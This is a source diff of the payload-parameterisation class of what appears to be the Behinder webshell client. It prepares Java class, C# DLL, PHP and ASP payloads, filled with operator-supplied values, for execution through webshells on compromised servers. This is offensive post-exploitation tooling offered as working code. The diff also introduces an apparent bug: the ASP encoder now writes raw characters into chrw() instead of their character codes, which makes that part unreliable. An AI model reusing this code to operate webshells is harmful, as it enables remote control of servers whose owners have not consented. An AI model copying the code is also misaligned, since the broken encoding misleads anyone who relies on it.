@@ -3,141 +3,177 @@ package net.rebeyond.behinder.core;
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import net.rebeyond.behinder.utils.ReplacingInputStream;
 import net.rebeyond.behinder.utils.Utils;
-import org.objectweb.asm.ClassAdapter;
 import org.objectweb.asm.ClassReader;
 import org.objectweb.asm.ClassWriter;
 import org.objectweb.asm.FieldVisitor;
+import org.objectweb.asm.util.CheckClassAdapter;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
-import java.io.InputStream;
+import java.util.Iterator;
 import java.util.Map;
 
 public class Params {
-
-    public static class t extends ClassLoader {
-        public Class get(byte[] b) {
-            return super.defineClass(b, 0, b.length);
-        }
+    public Params() {
     }
 
-    public static byte[] getParamedClass(String clsName, final Map<String, String> params) throws Exception {
+    public static byte[] getParamedClass(String clsName, final Map params) throws Exception {
         ClassReader classReader = new ClassReader(clsName);
         ClassWriter cw = new ClassWriter(1);
-        classReader.accept(new ClassAdapter(cw) {
-            /* class net.rebeyond.behinder.core.Params.AnonymousClass1 */
-
-            @Override // org.objectweb.asm.ClassAdapter, org.objectweb.asm.ClassVisitor
+        classReader.accept(new CheckClassAdapter(cw) {
             public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                 if (params.containsKey(filedName)) {
-                    return super.visitField(arg0, filedName, arg2, arg3, params.get(filedName));
+                    String paramValue = (String) params.get(filedName);
+                    return super.visitField(arg0, filedName, arg2, arg3, paramValue);
+                } else {
+                    return super.visitField(arg0, filedName, arg2, arg3, arg4);
                 }
-                return super.visitField(arg0, filedName, arg2, arg3, arg4);
             }
         }, 0);
-        return cw.toByteArray();
+        byte[] result = cw.toByteArray();
+        return result;
     }
 
-    public static byte[] getParamedClassForPlugin(String payloadPath, final Map<String, String> params) throws Exception {
+    public static byte[] getParamedClassForPlugin(String payloadPath, final Map params) throws Exception {
         ClassReader classReader = new ClassReader(Utils.getFileData(payloadPath));
         ClassWriter cw = new ClassWriter(1);
-        classReader.accept(new ClassAdapter(cw) {
-            /* class net.rebeyond.behinder.core.Params.AnonymousClass2 */
-
-            @Override // org.objectweb.asm.ClassAdapter, org.objectweb.asm.ClassVisitor
+        classReader.accept(new CheckClassAdapter(cw) {
             public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                 if (params.containsKey(filedName)) {
-                    return super.visitField(arg0, filedName, arg2, arg3, params.get(filedName));
+                    String paramValue = (String) params.get(filedName);
+                    return super.visitField(arg0, filedName, arg2, arg3, paramValue);
+                } else {
+                    return super.visitField(arg0, filedName, arg2, arg3, arg4);
                 }
-                return super.visitField(arg0, filedName, arg2, arg3, arg4);
             }
         }, 0);
-        return cw.toByteArray();
+        byte[] result = cw.toByteArray();
+        return result;
     }
 
     public static byte[] getParamedAssembly(String clsName, Map<String, String> params) throws Exception {
-        byte[] result = Utils.getResourceData("net/rebeyond/behinder/payload/csharp/" + clsName + ".dll");
+        String basePath = "net/rebeyond/behinder/payload/csharp/";
+        String payloadPath = basePath + clsName + ".dll";
+        byte[] result = Utils.getResourceData(payloadPath);
         if (params.keySet().size() == 0) {
             return result;
+        } else {
+            String paramsStr = "";
+            String paramValue;
+            for (String paramName : params.keySet()) {
+                paramValue = Base64.encode(params.get(paramName).getBytes());
+                paramsStr = paramsStr + paramName + ":" + paramValue + ",";
+            }
+
+            paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
+            String token = "~~~~~~" + paramsStr;
+            return Utils.mergeBytes(result, token.getBytes());
         }
-        String paramsStr = "";
-        for (String paramName : params.keySet()) {
-            paramsStr = paramsStr + paramName + ":" + Base64.encode(params.get(paramName).getBytes()) + ",";
-        }
-        return Utils.mergeBytes(result, ("~~~~~~" + paramsStr.substring(0, paramsStr.length() - 1)).getBytes());
     }
 
-    public static byte[] getParamedAssemblyClassic(String clsName, Map<String, String> params) throws Exception {
-        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/payload/csharp/" + clsName + ".dll"));
+    public static byte[] getParamedAssemblyClassic(String clsName, Map<String,String> params) throws Exception {
+        String basePath = "net/rebeyond/behinder/payload/csharp/";
+        String payloadPath = basePath + clsName + ".dll";
+        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
-        for (String paraName : params.keySet()) {
-            String paraValue = params.get(paraName);
+
+        for (Object o : params.keySet()) {
+            String paraName = (String) o;
+            String paraValue = (String) params.get(paraName);
             StringBuilder searchStr = new StringBuilder();
+
             while (searchStr.length() < paraValue.length()) {
                 searchStr.append(paraName);
             }
-            InputStream ris = new ReplacingInputStream(bis, Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0), Utils.ascii2unicode(paraValue, 1));
-            while (true) {
-                int b = ris.read();
-                if (-1 == b) {
-                    break;
-                }
+
+            byte[] search = Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0);
+            byte[] replacement = Utils.ascii2unicode(paraValue, 1);
+            ReplacingInputStream ris = new ReplacingInputStream(bis, search, replacement);
+
+            int b;
+            while (-1 != (b = ris.read())) {
                 bos.write(b);
             }
+
             ris.close();
         }
+
         return bos.toByteArray();
     }
 
-    public static byte[] getParamedPhp(String clsName, Map<String, String> params) throws Exception {
+    public static byte[] getParamedPhp(String clsName, Map<String,String> params) throws Exception {
+        String basePath = "net/rebeyond/behinder/payload/php/";
+        String payloadPath = basePath + clsName + ".php";
         StringBuilder code = new StringBuilder();
-        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/payload/php/" + clsName + ".php"));
+        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
-        while (true) {
-            int b = bis.read();
-            if (-1 == b) {
-                break;
-            }
+
+        int b;
+        while (-1 != (b = bis.read())) {
             bos.write(b);
         }
+
         bis.close();
         code.append(bos.toString());
         String paraList = "";
-        for (String paraName : params.keySet()) {
-            code.append(String.format("$%s=\"%s\";", paraName, params.get(paraName)));
-            paraList = paraList + ",$" + paraName;
+
+        String paraName;
+        for (Iterator var9 = params.keySet().iterator(); var9.hasNext(); paraList = paraList + ",$" + paraName) {
+            paraName = (String) var9.next();
+            String paraValue = (String) params.get(paraName);
+            code.append(String.format("$%s=\"%s\";", paraName, paraValue));
         }
-        code.append("\r\nmain(" + paraList.replaceFirst(",", "") + ");");
+
+        paraList = paraList.replaceFirst(",", "");
+        code.append("\r\nmain(" + paraList + ");");
         return code.toString().getBytes();
     }
 
-    public static byte[] getParamedAsp(String clsName, Map<String, String> params) throws Exception {
+    public static byte[] getParamedAsp(String clsName, Map<String,String> params) throws Exception {
+        String basePath = "net/rebeyond/behinder/payload/asp/";
+        String payloadPath = basePath + clsName + ".asp";
         StringBuilder code = new StringBuilder();
-        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/payload/asp/" + clsName + ".asp"));
+        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
-        while (true) {
-            int b = bis.read();
-            if (-1 == b) {
-                break;
-            }
+
+        int b;
+        while (-1 != (b = bis.read())) {
             bos.write(b);
         }
+
         bis.close();
         code.append(bos.toString());
         String paraList = "";
         if (params.size() > 0) {
-            String paraList2 = paraList + "Array(";
-            for (String paraName : params.keySet()) {
-                String paraValue = params.get(paraName);
-                String paraValueEncoded = "";
-                for (int i = 0; i < paraValue.length(); i++) {
-                    paraValueEncoded = paraValueEncoded + "&chrw(" + ((int) paraValue.charAt(i)) + ")";
+            paraList = paraList + "Array(";
+
+            String paraValueEncoded;
+            for (Iterator var9 = params.keySet().iterator(); var9.hasNext(); paraList = paraList + "," + paraValueEncoded) {
+                String paraName = (String) var9.next();
+                String paraValue = (String) params.get(paraName);
+                paraValueEncoded = "";
+
+                for (int i = 0; i < paraValue.length(); ++i) {
+                    paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
                 }
-                paraList2 = paraList2 + "," + paraValueEncoded.replaceFirst("&", "");
+
+                paraValueEncoded = paraValueEncoded.replaceFirst("&", "");
             }
-            paraList = paraList2 + ")";
+
+            paraList = paraList + ")";
         }
-        code.append("\r\nmain " + paraList.replaceFirst(",", "") + "");
+
+        paraList = paraList.replaceFirst(",", "");
+        code.append("\r\nmain " + paraList + "");
         return code.toString().getBytes();
+    }
+
+    public static class t extends ClassLoader {
+        public t() {
+        }
+
+        public Class get(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
     }
 }
